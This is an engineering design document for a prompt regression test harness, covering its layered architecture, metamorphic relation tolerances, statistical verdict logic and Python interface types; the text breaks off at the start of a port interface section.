# System Design: Four-Layer Composite Test Harness

> **Project:** PROJ-036 (Prompt Regression Harness)
> **Feature:** FEAT-036-001
> **Stream:** 1B (System Design + Threat Model)
> **Date:** 2026-03-07
> **Agent:** eng-architect
> **Source ADR:** ADR-001 (PROJ-035, Four-Layer Composite Test Harness Architecture, ACCEPTED)
> **Criticality:** C4 (Critical -- irreversible architecture, 67 agent definitions affected)
> **NIST CSF 2.0 Alignment:** Identify (ID.AM, ID.RA), Protect (PR.AC, PR.DS, PR.IP), Detect (DE.CM, DE.AE)
> **Iteration:** 3 (revised from iter 2 scoring: 0.937 PASS, targeting 0.94+ C4 threshold)

---

## Document Sections

| Section | Purpose |
|---------|---------|
| [L0: Executive Summary](#l0-executive-summary) | High-level architecture overview, key security decisions, threat summary |
| [Part 1: Hexagonal Architecture Design](#part-1-hexagonal-architecture-design) | System context, hexagonal diagram, module decomposition, dependency graph, integration patterns |
| [Part 2: Interface Contracts](#part-2-interface-contracts) | Internal data types, external interfaces, shared module interface |
| [Part 3: STRIDE Threat Model](#part-3-stride-threat-model) | Threat analysis for all 6 attack surfaces across all 6 STRIDE categories |
| [Part 4: Security Controls Mapping](#part-4-security-controls-mapping) | Threat-to-control mapping with implementation locations |
| [L2: Strategic Implications](#l2-strategic-implications) | Long-term evolution, security posture trade-offs, integration considerations |
| [Self-Review (S-010)](#self-review-s-010) | Pre-finalization verification checklist |
| [Evidence Traceability](#evidence-traceability) | Source references for all design decisions |

---

## L0: Executive Summary

The Four-Layer Composite Test Harness provides automated, statistically rigorous regression detection for the Jerry Framework's 67 agent definitions. The system detects whether a prompt change (agent definition edit) causes a quality regression before it merges to main.

**Architecture:** A hexagonal (ports-and-adapters) design isolates the domain core (statistical logic, metamorphic relation definitions, evaluation criteria) from external dependencies (promptfoo, DeepEval, GitHub Actions, LLM APIs). Four layers compose into a pipeline: Layer 1 (CI/CD gate) triggers Layer 2 (evaluation backend), which feeds Layer 3 (metamorphic relations) and Layer 4 (statistical comparison), producing a final PASS/WARN/FAIL verdict with confidence intervals.

**Key Security Decisions:**

1. **promptfoo runs in Docker** -- not directly installed. This isolates the Node.js runtime from Jerry's UV-only Python environment and prevents npm supply chain attacks from reaching the host.
2. **LLM API keys are managed exclusively through GitHub Actions secrets** -- never stored in YAML test cases, environment files, or committed to the repository. Key rotation follows GitHub's built-in secrets lifecycle.
3. **YAML test case files are treated as untrusted input** -- all test case inputs are validated against a strict schema before execution to prevent prompt injection via crafted test inputs.
4. **Baseline data integrity is enforced via git commit hash versioning** -- baseline scores are keyed to the exact commit hash and file path of the prompt that produced them, preventing baseline substitution attacks.
5. **Statistical comparison inputs are validated** -- the statistical engine rejects adversarially crafted score sequences that could defeat significance testing (e.g., all-zeros, all-ones, identical pairs).

**Threat Summary:** 40 threats identified across 6 attack surfaces. 9 rated High risk, 20 rated Medium risk, 11 rated Low risk. All threats have assigned mitigation controls (MC-01 through MC-40). The highest-impact threats are prompt injection via YAML test inputs (T-02, T-07), API key exposure in CI/CD logs (T-25), GitHub Actions workflow hijacking (T-29), and adversarial score tampering (T-35). These are addressed through input validation, secrets management, workflow permission restrictions, and statistical input validation respectively.

**Business Risk Impact:** Without this harness, prompt changes to agent definitions are deployed without regression validation. A single undetected regression across the 67 agent definitions could silently degrade the quality of all Jerry Framework outputs. The harness transforms prompt editing from an uncontrolled, manual-trust process into a statistically validated engineering workflow.

---

## Part 1: Hexagonal Architecture Design

### 1.1 System Context Diagram

```
                          EXTERNAL ACTORS
    +---------------------------------------------------------+
    |                                                         |
    |  [Developer]         [GitHub Actions]    [Anthropic     |
    |   Edits agent         PR trigger,        Claude API]    |
    |   definition          schedule trigger    LLM inference  |
    |   files               secret management                 |
    |     |                    |                   |          |
    |     |  git push          |  webhook          |  HTTPS   |
    |     |                    |                   |          |
    +-----+--------------------+-------------------+----------+
          |                    |                   |
          v                    v                   v
    +========================================================+
    ||                                                      ||
    ||          FOUR-LAYER COMPOSITE TEST HARNESS            ||
    ||                  (System Boundary)                    ||
    ||                                                      ||
    ||  +--------------------------------------------------+||
    ||  |              LAYER 1: CI/CD GATE                  |||
    ||  |  promptfoo (Docker) + GitHub Action               |||
    ||  +--------------------------------------------------+||
    ||  |              LAYER 2: EVALUATION BACKEND          |||
    ||  |  DeepEval (pytest plugin) + debiasing             |||
    ||  +--------------------------------------------------+||
    ||  |              LAYER 3: METAMORPHIC RELATIONS       |||
    ||  |  5 universal MRs (custom Python)                  |||
    ||  +--------------------------------------------------+||
    ||  |              LAYER 4: STATISTICAL ENGINE          |||
    ||  |  Wilcoxon + Wilson + Bonferroni (scipy)           |||
    ||  +--------------------------------------------------+||
    ||                                                      ||
    +========================================================+
          |                    |                   |
          v                    v                   v
    +-----+----+    +---------+--------+    +-----+--------+
    | Baseline |    | PR Comment /     |    | Langfuse     |
    | Store    |    | Status Check     |    | (optional)   |
    | (git-    |    | (GHA artifact,   |    | Observability|
    |  indexed)|    |  check API)      |    | Layer        |
    +-----------+    +------------------+    +--------------+

    DATA FLOWS:
    --> Agent definition files (git diff triggers pipeline)
    --> YAML test cases (loaded from tests/prompt-regression/)
    --> LLM API calls (prompt + response pairs, N >= 20)
    --> Score arrays (float[] from Layer 2 to Layers 3 and 4)
    --> Regression verdict (PASS/WARN/FAIL with CI and p-values)
    --> Baseline scores (stored/retrieved by git commit hash)
    --> PR status check (posted to GitHub PR via Actions API)
```

### 1.2 Hexagonal Architecture Diagram

```
+===========================================================================+
||                       HEXAGONAL ARCHITECTURE                            ||
||                Four-Layer Composite Test Harness                        ||
+===========================================================================+

                         INBOUND PORTS
    +-----------------------------------------------------------+
    |                                                           |
    |  [Port: TestRunner]        [Port: CITrigger]              |
    |   Run evaluation suite      Trigger from PR/schedule      |
    |   Accept test config        Accept event payload          |
    |   Return verdict            Return status check           |
    |                                                           |
    +----------+------------------------+-----------------------+
               |                        |
               v                        v
    +----------+------------------------+-----------------------+
    |                                                           |
    |  [Adapter: pytest]         [Adapter: GitHub Actions]      |
    |   conftest.py               workflow YAML                 |
    |   test discovery            event dispatch                |
    |   fixture injection         secret injection              |
    |                                                           |
    |  [Adapter: promptfoo]      [Adapter: CLI]                 |
    |   Docker container          jerry test-harness CLI        |
    |   YAML config loading       local development mode        |
    |   provider management                                     |
    |                                                           |
    +-----------------------------------------------------------+
               |                        |
               v                        v
    +===========================================================+
    ||                                                         ||
    ||                    DOMAIN CORE                           ||
    ||                                                         ||
    ||  +---------------------------------------------------+  ||
    ||  |  Evaluation Criteria (Layer 2 domain)              |  ||
    ||  |  - QualityCriterion (rubric definitions)           |  ||
    ||  |  - DebiasingStrategy (position/rubric shuffling)   |  ||
    ||  |  - ScoringResult (metric name + score + evidence)  |  ||
    ||  +---------------------------------------------------+  ||
    ||                                                         ||
    ||  +---------------------------------------------------+  ||
    ||  |  Metamorphic Relations (Layer 3 domain)            |  ||
    ||  |  - MetamorphicRelation (base abstraction)          |  ||
    ||  |  - TransformFunction (input transformation)        |  ||
    ||  |  - ConsistencyRelation (expected invariant)        |  ||
    ||  |  - MR-001 through MR-005 definitions               |  ||
    ||  +---------------------------------------------------+  ||
    ||                                                         ||
    ||  +---------------------------------------------------+  ||
    ||  |  Statistical Logic (Layer 4 domain)                |  ||
    ||  |  - VersionComparator (Wilcoxon signed-rank)        |  ||
    ||  |  - ConfidenceEstimator (Wilson score intervals)    |  ||
    ||  |  - MultiMetricCorrector (Bonferroni correction)    |  ||
    ||  |  - RegressionClassifier (verdict logic)            |  ||
    ||  +---------------------------------------------------+  ||
    ||                                                         ||
    ||  +---------------------------------------------------+  ||
    ||  |  Shared Types (cross-layer)                        |  ||
    ||  |  - ScoreArray, RegressionResult, VersionKey        |  ||
    ||  |  - BaselineRecord, EvaluationConfig                |  ||
    ||  |  - TestVerdict (PASS / WARN / FAIL)                |  ||
    ||  +---------------------------------------------------+  ||
    ||                                                         ||
    +===========================================================+
               |                        |
               v                        v
    +-----------------------------------------------------------+
    |                                                           |
    |  [Adapter: LLM API Client]  [Adapter: Baseline Store]    |
    |   Anthropic SDK              Git-indexed JSON files       |
    |   Rate limiting              Commit hash + path keys      |
    |   Retry with backoff         Read/write score records     |
    |                                                           |
    |  [Adapter: Report Generator] [Adapter: Langfuse]          |
    |   Markdown report output      Observability export        |
    |   PR comment formatting       Trace logging               |
    |   JSON artifact export        (optional)                  |
    |                                                           |
    +-----------------------------------------------------------+
    |                                                           |
    |  [Port: LLMInference]      [Port: BaselinePersistence]    |
    |   Send prompt, get response  Store/retrieve baselines     |
    |   Model configuration        Version key management       |
    |                                                           |
    |  [Port: ReportOutput]      [Port: Observability]          |
    |   Emit regression report     Export evaluation traces      |
    |   Format for target          (optional port)              |
    |                                                           |
    +-----------------------------------------------------------+
                         OUTBOUND PORTS
```

### 1.3 Module Decomposition

Module boundaries follow the four-layer architecture with clear separation. Each module is annotated with its hexagonal layer classification.

```
jerry/
  testing/                          # Package root (domain core + adapters)
    __init__.py                     # Package exports
    types.py                        # [DOMAIN] Shared type definitions
                                    #   (ScoreArray, RegressionResult,
                                    #   VersionKey, ModelPricing,
                                    #   MODEL_PRICING lookup table,
                                    #   composite model version utilities)
    config.py                       # [DOMAIN] EvaluationConfig, tier modes

    evaluation/                     # Layer 2: DeepEval integration
      __init__.py                   # Subpackage exports
      ports.py                      # [PORT] EvaluationPort protocol
      metrics.py                    # [DOMAIN] QualityCriterion, ScoringResult
      debiasing.py                  # [DOMAIN] DebiasingStrategy
      deepeval_adapter.py           # [ADAPTER] DeepEval BaseMetric impl
      criteria/                     # [DOMAIN] Per-agent G-Eval criteria
        __init__.py
        ps_researcher.py            # Criteria for ps-researcher
        ps_analyst.py               # Criteria for ps-analyst
        ps_architect.py             # Criteria for ps-architect
        ps_critic.py                # Criteria for ps-critic
        adv_scorer.py               # Criteria for adv-scorer

    metamorphic/                    # Layer 3: Metamorphic relation framework
      __init__.py                   # Subpackage exports
      base.py                       # [DOMAIN] MetamorphicRelation ABC
      mr_001_paraphrase.py          # [DOMAIN] MR-001 Paraphrase Consistency
      mr_002_negation.py            # [DOMAIN] MR-002 Negation Handling
      mr_003_context.py             # [DOMAIN] MR-003 Irrelevant Context
      mr_004_formatting.py          # [DOMAIN] MR-004 Formatting Perturbation
      mr_005_roundtrip.py           # [DOMAIN] MR-005 Language Round-Trip

    stats.py                        # [DOMAIN] Layer 4 statistical engine
                                    #   (shared with PROJ-017)
    layer4_stats.py                 # [ADAPTER] Layer 4 pipeline orchestration;
                                    #   imports from stats.py (one-way dependency);
                                    #   handles report formatting and GitHub
                                    #   Actions status API integration
                                    #   (see FR-019 Module Architecture Note)

    baselines/                      # Baseline persistence
      __init__.py                   # Subpackage exports
      ports.py                      # [PORT] BaselinePersistence protocol
      store.py                      # [ADAPTER] Git-indexed baseline store

    reports/                        # Report generation
      __init__.py                   # Subpackage exports
      ports.py                      # [PORT] ReportOutput protocol
      generator.py                  # [ADAPTER] Markdown/JSON report generator

tests/
  prompt-regression/                # Test cases and test infrastructure
    conftest.py                     # pytest fixtures, DeepEval config
    version_keys.py                 # Prompt version key management
    ps_researcher.yaml              # promptfoo test config: ps-researcher
    ps_analyst.yaml                 # promptfoo test config: ps-analyst
    ps_architect.yaml               # promptfoo test config: ps-architect
    ps_critic.yaml                  # promptfoo test config: ps-critic
    adv_scorer.yaml                 # promptfoo test config: adv-scorer
    metrics/                        # Custom assertion providers
      quality_score.py              # G-Eval quality scoring metric
      paraphrase_mr.py              # MR-001 promptfoo assertion
      negation_mr.py                # MR-002 promptfoo assertion
      format_mr.py                  # MR-004 promptfoo assertion
    unit/                           # Unit tests for harness modules
    property/                       # Property-based tests (hypothesis)
    integration/                    # Integration tests

.github/
  workflows/
    prompt-regression-smoke.yml     # Tier 1: every PR, structural only
    prompt-regression-standard.yml  # Tier 2: agent def PRs, N=10+
    prompt-regression-full.yml      # Tier 3: pre-release, N=30
  actions/
    cost-monitor/
      action.yml                    # Token/cost tracking composite action
    artifact-publish/
      action.yml                    # Score report artifact publisher

docker/
  promptfoo/
    Dockerfile                      # promptfoo containerized runtime
    .dockerignore                   # Exclude secrets, node_modules
```

**H-10 Compliance (one class per file):**

| File | Single Responsibility |
|------|----------------------|
| `types.py` | Data classes only (ScoreArray, RegressionResult, VersionKey, ModelPricing, MODEL_PRICING, composite model version format/parse utilities) |
| `config.py` | EvaluationConfig data class |
| `evaluation/metrics.py` | QualityCriterion, ScoringResult value objects |
| `evaluation/debiasing.py` | DebiasingStrategy class |
| `evaluation/deepeval_adapter.py` | DeepEvalAdapter class |
| `metamorphic/base.py` | MetamorphicRelation abstract base class |
| `metamorphic/mr_001_paraphrase.py` | ParaphraseConsistency class |
| `metamorphic/mr_002_negation.py` | NegationHandling class |
| `metamorphic/mr_003_context.py` | IrrelevantContextAppendation class |
| `metamorphic/mr_004_formatting.py` | FormattingPerturbation class |
| `metamorphic/mr_005_roundtrip.py` | LanguageRoundTrip class |
| `stats.py` | StatisticalEngine class |
| `layer4_stats.py` | Layer4Pipeline class (orchestrates stats.py; imports from stats, not vice versa) |
| `baselines/store.py` | BaselineStore class |
| `reports/generator.py` | ReportGenerator class |

### 1.4 Dependency Graph

The dependency graph enforces H-07 (domain layer isolation). Arrows indicate "depends on" direction.

```
DEPENDENCY GRAPH (H-07 Compliant)
=================================

Direction: Adapters --> Domain Core <-- Ports
           (Adapters depend on domain; domain depends on nothing external)


                    ADAPTERS (Inbound)
    +----------------------------------------------+
    |                                              |
    |  promptfoo_adapter ----+                     |
    |  (Docker, YAML)        |                     |
    |                        |                     |
    |  pytest_adapter -------+---> [evaluation/    |
    |  (conftest.py)         |      ports.py]      |
    |                        |         |           |
    |  gha_adapter ----------+         |           |
    |  (workflow YAML)                 |           |
    |                                  |           |
    |  cli_adapter -------------------]|           |
    +----------------------------------------------+
                                       |
                                       v
    +==================================================+
    ||                 DOMAIN CORE                     ||
    ||                                                 ||
    ||   types.py  <---------+----------+---------+    ||
    ||   config.py           |          |         |    ||
    ||                       |          |         |    ||
    ||   evaluation/         |          |         |    ||
    ||     metrics.py -------+          |         |    ||
    ||     debiasing.py -----+          |         |    ||
    ||     criteria/*.py ----+          |         |    ||
    ||                                  |         |    ||
    ||   metamorphic/                   |         |    ||
    ||     base.py ---------------------+         |    ||
    ||     mr_001_paraphrase.py --> base.py       |    ||
    ||     mr_002_negation.py ---> base.py        |    ||
    ||     mr_003_context.py ----> base.py        |    ||
    ||     mr_004_formatting.py -> base.py        |    ||
    ||     mr_005_roundtrip.py --> base.py        |    ||
    ||                                            |    ||
    ||   stats.py (shared with PROJ-017) ---------+    ||
    ||     depends on: types.py, scipy (external)      ||
    ||     DOES NOT depend on: evaluation, metamorphic ||
    ||                                                 ||
    +==================================================+
                                       |
                                       v
    +----------------------------------------------+
    |                ADAPTERS (Outbound)            |
    |                                              |
    |  [baselines/ports.py] <--- baselines/        |
    |                             store.py         |
    |                                              |
    |  [reports/ports.py] <----- reports/          |
    |                             generator.py     |
    |                                              |
    |  llm_api_adapter ---------> [LLM Port]       |
    |  (Anthropic SDK)                             |
    |                                              |
    |  langfuse_adapter --------> [Observability   |
    |  (optional)                  Port]           |
    +----------------------------------------------+


FORBIDDEN DEPENDENCIES (H-07 Violations):
  x  stats.py --> deepeval_adapter.py     (domain --> adapter)
  x  metrics.py --> promptfoo internals   (domain --> adapter)
  x  base.py --> DeepEval BaseMetric      (domain --> adapter)
  x  mr_*.py --> deepeval_adapter.py      (domain --> adapter)
  x  stats.py --> store.py               (domain --> adapter)
  x  types.py --> any adapter             (domain --> adapter)

ALLOWED EXTERNAL DEPENDENCIES (non-adapter):
  +  stats.py --> scipy.stats             (domain --> external math lib)
  +  stats.py --> statsmodels.stats       (domain --> external stats lib)
  +  types.py --> dataclasses             (domain --> stdlib)
  +  types.py --> enum                    (domain --> stdlib)
  +  base.py --> abc                      (domain --> stdlib)
```

**Key H-07 Enforcement Rules:**

1. **Domain modules** (`types.py`, `config.py`, `stats.py`, `evaluation/metrics.py`, `evaluation/debiasing.py`, `metamorphic/base.py`, `metamorphic/mr_*.py`, `evaluation/criteria/*.py`) import ONLY from each other, stdlib, and approved external math/stats libraries (scipy, statsmodels).
2. **Adapter modules** (`evaluation/deepeval_adapter.py`, `layer4_stats.py`, `baselines/store.py`, `reports/generator.py`) import from domain modules and their external library (DeepEval, GitHub Actions API, filesystem, etc.) but are never imported by domain modules.
3. **Port modules** (`evaluation/ports.py`, `baselines/ports.py`, `reports/ports.py`) define `Protocol` classes that adapters implement. Domain code references port protocols, never concrete adapters.

### 1.5 Component Integration Patterns

#### Pattern 1: Layer 1 triggers Layer 2

```
GitHub Actions Event (PR opened/updated)
    |
    v
prompt-regression-*.yml workflow
    |
    +--> Detect modified agent definition files (git diff)
    |    Filter: skills/*/agents/*.md
    |
    +--> Select evaluation tier:
    |    - Smoke: non-agent-def changes (structural only)
    |    - Standard: agent-def changes (N=10 minimum)
    |    - Full: manual trigger or pre-release (N=30)
    |
    +--> Launch promptfoo Docker container
    |    Mount: tests/prompt-regression/*.yaml (read-only)
    |    Mount: skills/*/agents/*.md (read-only)
    |    Inject: ANTHROPIC_API_KEY from GHA secrets
    |
    +--> promptfoo executes test cases:
    |    - Load YAML test config for affected agents
    |    - Run prompt version A (base branch) N times
    |    - Run prompt version B (PR branch) N times
    |    - Invoke custom Python assertion providers
    |      (these call into Layer 2 via subprocess)
    |
    v
Layer 2 receives raw LLM outputs as test cases
```

**Integration mechanism:** promptfoo's `python` assertion type executes custom Python scripts. These scripts import from `jerry.testing.evaluation` to perform DeepEval-based scoring. The promptfoo container mounts the Python assertion scripts read-only and invokes them via `uv run python`.

**Smoke tier bypass:** When EvaluationTier is SMOKE, the statistical engine (Layer 4) is bypassed entirely. Smoke mode runs structural checks only (schema validation, file existence, import resolution) without invoking the LLM or computing statistical comparisons. The N=1 annotation on the SMOKE enum value indicates a single structural check pass, not a single LLM evaluation fed into the statistical engine.

#### Pattern 2: Layer 2 feeds Layer 3

```
Layer 2 (DeepEval evaluation)
    |
    +--> G-Eval scoring with debiasing:
    |    - Position randomization (swap candidate order)
    |    - Rubric criterion shuffling (random order per eval)
    |    - Score: 0.0 to 1.0 per criterion
    |
    +--> For each test case, Layer 3 MR checks run in parallel:
    |
    |    Original input -----> Layer 2 score = S_original
    |         |
    |         +--> MR-001: Paraphrase(input) --> Layer 2 score = S_para
    |         |    Assert: |S_original - S_para| <= 0.05
    |         |
    |         +--> MR-002: Negate(input) --> Layer 2 score = S_neg
    |         |    Assert: effect_size(S_original, S_neg) >= 0.40
    |         |
    |         +--> MR-003: AppendIrrelevant(input) --> Layer 2 score = S_ctx
    |         |    Assert: |S_original - S_ctx| <= 0.03
    |         |
    |         +--> MR-004: ReformatMarkdown(input) --> Layer 2 score = S_fmt
    |         |    Assert: |S_original - S_fmt| <= 0.05
    |         |
    |         +--> MR-005: RoundTrip(input) --> Layer 2 score = S_rt
    |              Assert: |S_original - S_rt| <= 0.06
    |
    v
Score arrays [S_1, S_2, ..., S_N] + MR pass/fail results
passed to Layer 4
```

**Metamorphic Relation Tolerance Specification:**

| MR ID | Relation | Tolerance | Type | Derivation Rationale |
|-------|----------|-----------|------|---------------------|
| MR-001 | Paraphrase Consistency | 0.05 (absolute delta) | Symmetric | Paraphrased prompts should produce near-identical quality scores. The 0.05 threshold accommodates LLM non-determinism (temperature-induced variance) while catching meaningful sensitivity to surface wording. Calibrated against ADR-001 Phase 1A oracle problem analysis: LLM-as-Judge variance on identical inputs is typically 0.02-0.03; the 0.05 tolerance provides 2x headroom above noise floor. |
| MR-002 | Negation Handling | Effect size >= 0.40 (Cohen's d) | Directional | Negating task instructions should produce a measurable quality drop. A Cohen's d of 0.40 represents a "small-to-medium" effect per conventional benchmarks. Directional check (S_neg < S_original) rather than absolute delta because negation magnitude varies by prompt complexity. The 0.40 threshold is set conservatively: too low (< 0.20) catches noise; too high (> 0.80) misses genuine but moderate sensitivity failures. Initial value derived from ADR-001 PAT-001 metamorphic testing literature review. |
| MR-003 | Irrelevant Context | 0.03 (absolute delta) | Symmetric | Appending irrelevant context to the prompt should not affect output quality. Tighter than MR-001 because irrelevant context injection is a weaker perturbation than paraphrasing -- if an agent is sensitive to irrelevant suffix text, that indicates a fragility concern. The 0.03 threshold is 1.5x the observed LLM-as-Judge noise floor of 0.02. |
| MR-004 | Formatting Perturbation | 0.05 (absolute delta) | Symmetric | Reformatting markdown (heading levels, bullet styles, whitespace normalization) should not affect quality. Same tolerance as MR-001 because formatting perturbation is a comparable surface-level change. |
| MR-005 | Language Round-Trip | 0.06 (absolute delta) | Symmetric | Translating the prompt to another language and back introduces more semantic noise than paraphrasing alone. The 0.06 tolerance provides 20% additional headroom over MR-001 (0.05) to accommodate translation-induced synonym substitution and sentence restructuring. |

**Tolerance calibration methodology:** Initial values above are derived from ADR-001 Phase 1A's oracle problem analysis and PAT-001 metamorphic testing literature. These are starting values subject to empirical calibration during implementation Phase D (Metamorphic). The calibration process is: (1) run each MR against 5 known-stable agent definitions 30 times each; (2) compute the empirical distribution of deltas; (3) set tolerance at the 95th percentile of the observed delta distribution, plus a 25% safety margin. Recalibrate when new agent types are added or evaluation criteria change.

**Integration mechanism:** Each MR is implemented as a domain class (`MetamorphicRelation` subclass) that defines a `transform()` method and a `check_consistency()` method. The DeepEval adapter wraps each MR as a `BaseMetric` subclass for pytest integration. The domain MR classes do NOT import DeepEval -- the adapter performs the translation.

#### Pattern 3: Layer 3 feeds Layer 4

```
Layer 3 (MR checks complete)
    |
    +--> Score arrays collected:
    |    scores_a: [s_a1, s_a2, ..., s_aN]  (version A, N runs)
    |    scores_b: [s_b1, s_b2, ..., s_bN]  (version B, N runs)
    |    mr_results: [MR-001: pass/fail, ..., MR-005: pass/fail]
    |
    v
Layer 4 (Statistical Comparison Engine)
    |
    +--> Validate inputs:
    |    - N >= 20 for Standard/Full (raise InsufficientSamplesError)
    |    - Score values in [0.0, 1.0]
    |    - No constant arrays (all identical values)
    |
    +--> Wilcoxon signed-rank test:
    |    - H0: no difference between version A and B
    |    - Compute test statistic and p-value
    |    - Apply Bonferroni correction for K metrics
    |    - Corrected alpha = 0.05 / K
    |      (k=13 for full evaluation suite per contracts D.3;
    |       k=10 for benchmark runs per NFR-003;
    |       k=5 for simplified statistical runs per NFR-007)
    |
    +--> Wilson score intervals:
    |    - Per-metric pass rate: count(s >= 0.92) / N
    |    - Wilson CI for each metric's pass rate
    |    - Compare CIs between version A and B
    |
    +--> Classification:
    |    - REGRESSION: p < alpha AND mean(B) < mean(A)
    |    - MARGINAL: p < 0.10 but p >= alpha
    |    - NO_REGRESSION: p >= 0.10
    |
    v
RegressionResult(verdict, p_value, ci_a, ci_b, mr_summary)
```

#### Pattern 4: Layer 4 produces final verdict

```
Layer 4 output: RegressionResult
    |
    +--> Report Generator produces:
    |    - Markdown summary (for PR comment)
    |    - JSON artifact (for programmatic consumption)
    |    - Baseline update recommendation (if NO_REGRESSION)
    |
    +--> CI/CD Gate Decision:
    |    PASS  --> Green check on PR; optional baseline update
    |    WARN  --> Yellow status; human review recommended
    |    FAIL  --> Red status; merge blocked; detailed report posted
    |
    +--> Baseline Store:
    |    If PASS and version B scores > version A:
    |    Store version B scores as new baseline
    |    Key: (git_commit_hash, agent_file_path)
    |
    +--> Langfuse (optional):
         Log evaluation trace for trend analysis
```

---

## Part 2: Interface Contracts

### 2.1 Internal Interfaces (Domain Types)

All types defined in `jerry/testing/types.py`. These are the data contracts flowing between layers.

```python
"""Shared type definitions for the Four-Layer Composite Test Harness.

All domain types used across Layers 1-4 are defined here.
Adapters consume these types; domain modules produce them.
This module has NO external dependencies beyond stdlib.
"""

from __future__ import annotations

from dataclasses import dataclass, field
from enum import Enum
from typing import Optional


class TestVerdict(Enum):
    """Final CI/CD gate decision.

    Three-valued classification from Layer 4 statistical analysis.
    Maps directly to GitHub Actions check status.
    """

    PASS = "PASS"           # No regression detected (p >= 0.10)
    WARN = "WARN"           # Marginal regression (0.05 <= p < 0.10)
    FAIL = "FAIL"           # Regression detected (p < alpha)


class EvaluationTier(Enum):
    """Tiered evaluation mode controlling sample size and metric scope.

    Controls cost/rigor trade-off per ADR-001 FM-006 mitigation.
    Note: SMOKE bypasses the statistical engine entirely. The N=1
    annotation indicates a single structural check pass, not a single
    LLM evaluation. No LLM calls are made in SMOKE mode.
    """

    SMOKE = "smoke"         # Structural checks only (no LLM), $0
    STANDARD = "standard"   # N>=10, LLM-as-Judge + structural, ~$2
    FULL = "full"           # N>=30, all layers including MRs, ~$5-8


@dataclass(frozen=True)
class VersionKey:
    """Composite key identifying a specific prompt version.

    Used by the baseline store to index score records.
    Combines git commit hash with agent file path for unique identification.
    """

    commit_hash: str        # Git commit SHA (40 hex chars)
    file_path: str          # Repo-relative path (e.g., skills/problem-solving/agents/ps-researcher.md)

    def __post_init__(self) -> None:
        """Validate commit hash format and file path."""
        if len(self.commit_hash) != 40:
            raise ValueError(
                f"Commit hash must be 40 hex characters, got {len(self.commit_hash)}"
            )
        if not self.file_path.endswith(".md"):
            raise ValueError(
                f"Agent file path must end with .md, got {self.file_path}"
            )


@dataclass(frozen=True)
class ScoreArray:
    """Array of evaluation scores from N runs of a single prompt version.

    The fundamental data unit flowing from Layer 2 to Layer 4.
    Each score is a float in [0.0, 1.0] from a single evaluation run.
    """

    metric_name: str             # e.g., "quality_score", "completeness"
    scores: tuple[float, ...]    # Immutable score sequence
    version_key: VersionKey      # Which prompt version produced these

    def __post_init__(self) -> None:
        """Validate score values are in [0.0, 1.0]."""
        for i, s in enumerate(self.scores):
            if not 0.0 <= s <= 1.0:
                raise ValueError(
                    f"Score at index {i} out of range [0.0, 1.0]: {s}"
                )

    @property
    def n(self) -> int:
        """Return sample size."""
        return len(self.scores)


@dataclass(frozen=True)
class ConfidenceInterval:
    """Wilson score confidence interval for a metric pass rate.

    Represents uncertainty in the proportion of runs that pass
    a quality threshold (default 0.92).
    """

    lower: float     # Lower bound of CI
    upper: float     # Upper bound of CI
    point: float     # Point estimate (pass_count / N)
    method: str = "wilson"  # CI computation method


@dataclass(frozen=True)
class WilcoxonResult:
    """Result of Wilcoxon signed-rank test comparing two versions.

    Contains the test statistic, p-value, and corrected alpha
    for multi-metric comparison.
    """

    statistic: float             # Wilcoxon test statistic (W)
    p_value: float               # Two-sided p-value
    corrected_alpha: float       # Bonferroni-corrected significance level
    n_metrics: int               # Number of metrics (for Bonferroni)
    is_significant: bool         # p_value < corrected_alpha


@dataclass(frozen=True)
class MRResult:
    """Result of a single metamorphic relation check.

    Produced by Layer 3 for each MR applied to each test case.
    """

    mr_id: str                   # e.g., "MR-001"
    mr_name: str                 # e.g., "Paraphrase Consistency"
    passed: bool                 # Whether the MR invariant held
    original_score: float        # Score on original input
    transformed_score: float     # Score on transformed input
    delta: float                 # |original - transformed|
    tolerance: float             # Configured tolerance threshold
    evidence: str                # Human-readable explanation


@dataclass(frozen=True)
class RegressionResult:
    """Complete regression analysis result from Layer 4.

    The final output consumed by the report generator and CI/CD gate.
    """

    verdict: TestVerdict
    metric_name: str
    p_value: float
    ci_version_a: ConfidenceInterval
    ci_version_b: ConfidenceInterval
    mean_a: float
    mean_b: float
    effect_size: float           # Cohen's d or rank-biserial
    n_samples_a: int
    n_samples_b: int


@dataclass
class EvaluationReport:
    """Complete evaluation report aggregating all layer results.

    Produced by the report generator as the final harness output.
    """

    agent_name: str
    tier: EvaluationTier
    version_a: VersionKey
    version_b: VersionKey
    overall_verdict: TestVerdict
    regression_results: list[RegressionResult] = field(default_factory=list)
    mr_results: list[MRResult] = field(default_factory=list)
    timestamp: str = ""          # ISO 8601
    smoke_label: str = ""        # "STRUCTURAL ONLY" for Smoke tier

    @property
    def has_regression(self) -> bool:
        """Return True if any metric shows regression."""
        return any(r.verdict == TestVerdict.FAIL for r in self.regression_results)

    @property
    def has_mr_violation(self) -> bool:
        """Return True if any metamorphic relation was violated."""
        return any(not mr.passed for mr in self.mr_results)


@dataclass(frozen=True)
class BaselineRecord:
    """Stored baseline data for a specific agent at a specific version.

    Persisted by the baseline store adapter.
    """

    version_key: VersionKey
    agent_name: str
    scores: dict[str, ScoreArray]    # metric_name -> ScoreArray
    quality_gate_passed: bool        # Was quality gate checked before storage?
    captured_at: str                 # ISO 8601 timestamp
    tier: EvaluationTier             # Which tier captured these scores
```

### 2.2 Port Interfaces

#### EvaluationPort (Layer 2 inbound)

```python
"""Evaluation port defining the contract for metric evaluation backends.

Located at: jerry/testing/evaluation/ports.py
Implemented by: DeepEvalAdapter (jerry/testing/evaluation/deepeval_adapter.py)
"""

from typing import Protocol

from jerry.testing.types import ScoreArray, VersionKey, EvaluationTier


class EvaluationPort(Protocol):
    """Port for evaluating LLM outputs against quality criteria.

    Any evaluation backend must implement this protocol.
    Current implementation: DeepEval via deepeval_adapter.py.
    """

    def evaluate(
        self,
        prompt: str,
        output: str,
        criteria: list[str],
        agent_name: str,
    ) -> dict[str, float]:
        """Evaluate a single LLM output against named criteria.

        Args:
            prompt: The input prompt sent to the LLM.
            output: The LLM's response text.
            criteria: List of criterion names to score.
            agent_name: Name of the agent being evaluated.

        Returns:
            Dictionary mapping criterion name to score in [0.0, 1.0].
        """
        ...

    def evaluate_batch(
        self,
        prompt: str,
        outputs: list[str],
        criteria: list[str],
        agent_name: str,
        version_key: VersionKey,
    ) -> dict[str, ScoreArray]:
        """Evaluate N outputs and return score arrays per criterion.

        Args:
            prompt: The input prompt (same for all outputs).
            outputs: List of N LLM responses.
            criteria: List of criterion names to score.
            agent_name: Name of the agent being evaluated.
            version_key: Version identifier for these outputs.

        Returns:
            Dictionary mapping criterion name to ScoreArray.
        """
        ...
```

#### BaselinePersistence Port

```python
